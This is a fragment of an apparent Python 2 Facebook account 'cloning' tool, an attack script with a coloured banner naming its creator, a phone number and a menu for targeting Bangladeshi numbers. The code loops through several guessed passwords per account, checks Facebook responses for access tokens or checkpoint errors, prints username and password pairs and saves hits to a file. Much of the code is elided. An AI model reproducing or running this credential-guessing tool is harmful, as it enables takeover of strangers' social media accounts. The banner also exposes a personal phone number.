...
\033[1;97m===============================================
\033[1;92m☣CREATER   :  Somi awan჻
\033[1;96m☣WHATAAP : 03455453538჻
\033[1;91m☣FACEBOOK Somi Awan჻
\033[1;95m☣WITHOUT PKG CLONING ჻
\033[1;94m☣NEW TREND AM BRAMD ჻
\033[1;97m===============================================
...
\033[1;96m
\033[1;97m[1] SPAIN\033[1;92m 9540 TO 9970
...
def menu():
    ...
    print 47* '\033[1;97m⁃'
    print
    jalan('\033[1;91m (\033[1;92m1\033[1;91m)\033[1;93m START CLONING BANGLADESH ')
    print
    time.sleep(0.5)
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(Aftar \x1b[1;95m7days) ' + k + c + user + ' → ' + pass1
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m(Aftar \x1b[1;95m7days) ' + k + c + user + ' → ' + pass2
                            cps = open('save/checkpoint.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(Aftar \x1b[1;95m7days) ' + k + c + user + ' → ' + pass3 
                                    cps = open('save/checkpoint.txt', 'a')
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;92m(Aftar \x1b[1;95m7days) ' + k + c + user + ' → ' + pass4
                                            cps = open('save/checkpoint.txt', 'a')
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;92m(Aftar \x1b[1;95m7days) ' + k + c + user + ' → ' + pass5 
                                                    cps = open('save/checkpoint.txt', 'a')
